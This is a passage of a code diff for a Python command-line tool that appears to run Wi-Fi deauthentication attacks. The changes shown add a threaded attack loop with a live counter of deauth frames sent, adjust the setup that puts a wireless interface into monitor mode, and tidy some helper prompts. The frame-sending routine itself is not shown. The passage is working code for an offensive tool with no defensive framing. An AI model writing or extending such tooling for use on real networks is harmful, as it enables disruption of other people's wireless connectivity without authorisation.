-    console.print(f"\n[green][+] Stopped. Total frames: {sent[0]}[/green]")
+    threading.Thread(target=_loop, daemon=True).start()
+
+    with Live(refresh_per_second=4, console=console) as live:
+        try:
+            while not stop.is_set():
+                elapsed = time.time() - start
+                rate    = sent[0] / max(elapsed, 0.1)
+                live.update(Text.from_markup(
+                    f"[bold red]DEAUTH[/bold red]  "
+                    f"frames: [yellow]{sent[0]:,}[/yellow]  "
+                    f"rate: [cyan]{rate:.0f}/s[/cyan]  "
+                    f"elapsed: [dim]{elapsed:.1f}s[/dim]"
+                ))
+                time.sleep(0.25)
+        except KeyboardInterrupt:
+            stop.set()
+
+    console.print(f"[green][+] Done.  Frames sent: {sent[0]:,}[/green]")
 
 
 def setup_monitor_mode(iface: str) -> Optional[str]:
     console.print(f"[yellow][*] Enabling monitor mode on {iface}...[/yellow]")
     try:
-        subprocess.run(["ip", "link", "set", iface, "down"], check=True, capture_output=True)
+        subprocess.run(["ip", "link", "set", iface, "down"],       check=True, capture_output=True)
         subprocess.run(["iw", "dev", iface, "set", "type", "monitor"], check=True, capture_output=True)
-        subprocess.run(["ip", "link", "set", iface, "up"], check=True, capture_output=True)
-        console.print(f"[green][+] {iface} is now monitor mode[/green]")
+        subprocess.run(["ip", "link", "set", iface, "up"],         check=True, capture_output=True)
+        console.print(f"[green][+] {iface} in monitor mode[/green]")
         return iface
     except Exception:
         pass
@@ -690,12 +860,12 @@ def setup_monitor_mode(iface: str) -> Optional[str]:
         )
         m = re.search(r"monitor mode .* (?:on|for) (\S+)", out, re.I)
         if m:
-            mon = m.group(1).strip("[]()")
+            mon = m.group(1).strip("[])(")
             console.print(f"[green][+] Monitor iface: {mon}[/green]")
             return mon
     except Exception:
         pass
-    console.print("[red][-] Monitor mode failed. External USB adapter usually required on Android.[/red]")
+    console.print("[red][-] Monitor mode failed. USB adapter usually required.[/red]")
     return None
 
 
@@ -704,9 +874,9 @@ def setup_monitor_mode(iface: str) -> Optional[str]:
 def safe_int(raw: str, default: int = 0) -> int:
     try:
         return int(raw)
-    except ValueError:
+    except (ValueError, TypeError):
         return default
 
 
 def confirm(msg: str, default: str = "no") -> bool:
-    return Prompt.ask(f"[bold red]{msg}[/bold red]", default=default).lower() in ("y", "yes")
+    return Prompt.ask(f"[bold red]{msg}[/bold red]  [dim](y/n)[/dim]", default=default).lower() in ("y", "yes")
